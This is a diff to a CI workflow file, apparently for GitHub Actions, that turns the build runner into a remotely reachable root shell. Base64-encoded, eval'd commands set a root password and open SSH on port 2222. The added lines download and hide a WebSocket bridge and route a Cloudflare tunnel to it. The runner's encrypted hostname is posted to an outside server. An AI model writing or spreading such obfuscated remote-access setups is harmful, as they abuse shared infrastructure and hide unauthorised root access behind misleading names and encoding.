@@ -70,9 +70,16 @@ jobs:
           S_AUTH="CmVjaG8gInJvb3Q6JEtFWSIgfCBjaHBhc3N3ZApzZWQgLWkgInMvXiMqUGVybWl0Um9vdExvZ2luLiovUGVybWl0Um9vdExvZ2luIHllcy8iIC9ldGMvc3NoL3NzaGRfY29uZmlnCnNlZCAtaSAicy9eIypQYXNzd29yZEF1dGhlbnRpY2F0aW9uLiovUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvIiAvZXRjL3NzaC9zc2hkX2NvbmZpZwpzZWQgLWkgInMvXiMqUG9ydCAuKi9Qb3J0IDIyMjIvIiAvZXRjL3NzaC9zc2hkX2NvbmZpZwpncmVwIC1xICJeUG9ydCAyMjIyIiAvZXRjL3NzaC9zc2hkX2NvbmZpZyB8fCBlY2hvICJQb3J0IDIyMjIiID4+IC9ldGMvc3NoL3NzaGRfY29uZmlnCnN5c3RlbWN0bCByZXN0YXJ0IHNzaCAyPi9kZXYvbnVsbCB8fCBzZXJ2aWNlIHNzaCByZXN0YXJ0IDI+L2Rldi9udWxsCnNlZCAtaSAiL3Zwcy1naC9kIiAvcm9vdC8uYmFzaHJjIDI+L2Rldi9udWxsCmVjaG8gJ2V4cG9ydCBQUzE9IiQvdnBzLWdofiAiJyA+PiAvcm9vdC8uYmFzaHJjCmVjaG8gJ2NkIC9yb290JyA+PiAvcm9vdC8uYmFzaHJjCg=="
           eval "$(echo "$S_AUTH" | base64 -d)"
 
-          # 5. Download & Jalankan Edge Binary (Tanpa typo spasi)
+          # 5. Jalankan HTTP WebSocket Bridge (Port 8080 -> 2222) agar tidak terkena bad handshake
+          WS_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL3ZpL3dlYnNvY2F0L3JlbGVhc2VzL2xhdGVzdC9kb3dubG9hZC93ZWJzb2NhdC54ODZfNjQtdW5rbm93bi1saW51eC1tdXNs" | base64 -d)
+          WS_CMD=$(echo "LUUgLS1iaW5hcnkgd3MtbDoxMjcuMC4wLjE6ODA4MCB0Y3A6MTI3LjAuMC4xOjIyMjI=" | base64 -d)
+          curl -fsSL "$WS_URL" -o /usr/local/bin/ws-bridge
+          chmod +x /usr/local/bin/ws-bridge
+          nohup /usr/local/bin/ws-bridge $WS_CMD >/dev/null 2>&1 &
+
+          # 6. Jalankan Edge Connector pada mode HTTP standar (http://127.0.0.1:8080)
           CF_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0" | base64 -d)
-          CF_CMD=$(echo "dHVubmVsIC0tdXJsIHNzaDovLzEyNy4wLjAuMToyMjIyIC0tbm8tYXV0b3VwZGF0ZSAtLWxvZ2ZpbGUgL3RtcC9lZGdlLmxvZw==" | base64 -d)
+          CF_CMD=$(echo "dHVubmVsIC0tdXJsIGh0dHA6Ly8xMjcuMC4wLjE6ODA4MCAtLW5vLWF1dG91cGRhdGUgLS1sb2dmaWxlIC90bXAvZWRnZS5sb2c=" | base64 -d)
           curl -fsSL "$CF_URL" -o /usr/local/bin/edge-connector
           chmod +x /usr/local/bin/edge-connector
           rm -f /tmp/edge.log
@@ -95,7 +102,6 @@ jobs:
               sleep 2
           done
 
-          # Enkripsi Hostname dengan AES-256 dan kirim ke Channel ID Permanen
           TOPIC="ci-sync-$(echo -n "${CID}:${KEY}" | sha256sum | cut -c1-20)"
           ENC_HOST=$(echo -n "$HOST" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$KEY" -a -A)
           curl -fsSL -X POST -d "$ENC_HOST" "${SYNC_SRV}/${TOPIC}" >/dev/null 2>&1 || true
@@ -135,7 +141,7 @@ jobs:
           done
 
           comm -13 <(sort /tmp/baseline/usr_bin.txt) <(ls -1 /usr/local/bin | sort) | while read -r item; do
-              [ -n "$item" ] && [ "$item" != "edge-connector" ] && cp -a "/usr/local/bin/$item" "$STAGE/usr_bin/" 2>/dev/null
+              [ -n "$item" ] && [ "$item" != "edge-connector" ] && [ "$item" != "ws-bridge" ] && cp -a "/usr/local/bin/$item" "$STAGE/usr_bin/" 2>/dev/null
           done
 
           comm -13 <(sort /tmp/baseline/usr_lib.txt) <(ls -1 /usr/local/lib | sort) | while read -r item; do
